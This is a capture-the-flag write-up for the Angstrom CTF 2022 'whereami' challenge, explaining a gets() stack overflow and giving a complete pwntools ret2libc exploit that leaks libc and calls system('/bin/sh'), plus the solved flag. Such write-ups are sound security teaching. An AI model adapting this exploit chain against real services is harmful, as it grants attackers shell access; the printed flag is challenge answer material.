---
title: "[Pwn] whereami [Angstrom CTF 2022]"
date: 2022-05-06 23:48:00
---

# 0x0 Introduction

Click on the eyes.

@_@

nc challs.actf.co 31222

files: [whereami](whereami), [libc.so.6](libc.so.6)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


# 0x2 Vulnerability

classic **ret2libc** chall, in function `main` there is a `gets` function. We can use this `gets` to construct rop chain. 

One thing to notice is that function `main` have a counter, counter increase by 1 everytime we call `main`. if counter is larger than 0, program will exit immediately. Therefore, in the first ropchain, we also need to set counter back to 0.

So, we need to construct following rop chain.

first ropchain
```
puts(got.printf) # leak libc address
gets(obj.counter) # set counter to 0
main()
```

second ropchain
```
sysmte("/bin/sh")
```

then we got a shell.


# 0x3 Exploit

```
io = start()
wait_for_debugger(io)

ret_addr = exe_rop.find_gadget(['ret'])[0]
pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]
print(pop_rdi_ret_addr,ret_addr)
io.sendlineafter(b"you?",flat({
    0x40+0x8: [
        ret_addr,
        pop_rdi_ret_addr,
        exe.got["printf"],
        exe.plt["puts"],
        pop_rdi_ret_addr,
        exe.symbols["counter"],
        exe.plt["gets"],
        exe.sym["main"],
    ]
}))
print(io.recvuntil(b'too.\n'))
libc_base_addr = int.from_bytes(io.recvuntil(b'\n',drop=True),"little") - libc.sym["printf"]
input(hex(libc_base_addr))
io.sendline(flat({0:[0]}))
print(hex(libc_base_addr+libc.sym["system"]))
io.sendlineafter(b"you? ",flat({
    0x40:b"AAAAAAAA",
    0x40+0x8: [
        ret_addr,
        pop_rdi_ret_addr,
        libc_base_addr+next(libc.search(b"/bin/sh")),
        libc_base_addr+libc.sym["system"],
    ]
}))
io.interactive()

```

# 0x4 Flag

actf{i'd_be_saf3_and_w4rm_if_1_wa5_in_la_5ca5e33ff06f}